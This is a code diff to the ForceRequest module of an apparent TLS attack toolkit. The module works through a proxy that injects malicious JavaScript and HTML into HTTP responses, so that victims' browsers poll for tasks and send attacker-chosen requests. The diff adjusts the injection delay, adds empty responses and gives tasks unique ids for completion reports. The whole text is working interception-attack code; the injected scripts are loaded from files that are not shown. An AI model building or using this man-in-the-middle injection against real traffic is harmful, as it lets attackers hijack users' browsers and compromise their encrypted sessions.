@@ -10,7 +10,7 @@ from tls_attack.proxy.HTTPProxyServer import *
 
 # Delay between each attempt in seconds to injection 
 # malicious JavaScript in a HTTP response
-SCRIPT_INJECTION_DELAY = 1
+SCRIPT_INJECTION_DELAY = 10
 
 # Static content of the module used for the injection
 # and the communication
@@ -18,6 +18,9 @@ CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__)) + "/"
 HTML_INJECTION_CONTENT       = bytes(open(CURRENT_FOLDER + "resources/injection.html").read(), "ascii")
 JAVASCRIPT_INJECTION_CONTENT = bytes(open(CURRENT_FOLDER + "resources/injection.js").read(), "ascii")
 JAVASCRIPT_MAIN_MODULE       = bytes(open(CURRENT_FOLDER + "resources/force_request.js").read(), "ascii")
+
+# Static HTTPResponse
+EMPTY_RESPONSE = HTTPResponse.create_response_from_content(b"", b"application/json")
 
 class ForceRequest:
     def __init__(self, proxy):
@@ -77,19 +80,27 @@ class ForceRequest:
         # Message to retrieve the next request to force
         if message == b"get_task":
             if len(queue["task"]) == 0:
-                return
+                return EMPTY_RESPONSE
 
-            task = json.dumps(queue["task"][0])
+            task = json.dumps(queue["task"][0].__dict__)
             return HTTPResponse.create_response_from_content(bytes(task, "ascii"), b"application/json")
 
         # Message to tell the server that the last request was 
         # sucessfully forced
-        if message == b"task_done":
+        if message.find(b"task_done/") == 0:
             if len(queue["task"]) == 0:
-                return
+                return EMPTY_RESPONSE
 
             try:
-                task = queue["task"].pop(0)
+                task_id = message[10:]
+                task = queue["task"][0]
+
+                # If the ID is not the same, it's a previous request that 
+                # was already reported as completed.
+                if not task_id == bytes(task.id, "ascii"):
+                    return EMPTY_RESPONSE
+
+                queue["task"].pop(0)
                 task.callback(task)
             except Exception as e:
                 logging.error(traceback.format_exc())
@@ -127,6 +138,7 @@ class ForceRequest:
 class ForceRequestTask:
     def __init__(self, url, post_data, callback):
         self.url = url
-        self.post_data = post_data
+        self.post_data = "" if post_data is None else post_data
         self.callback = callback
         self.last_attempt = time.time()
+        self.id = str(uuid.uuid4()).replace("-", "")
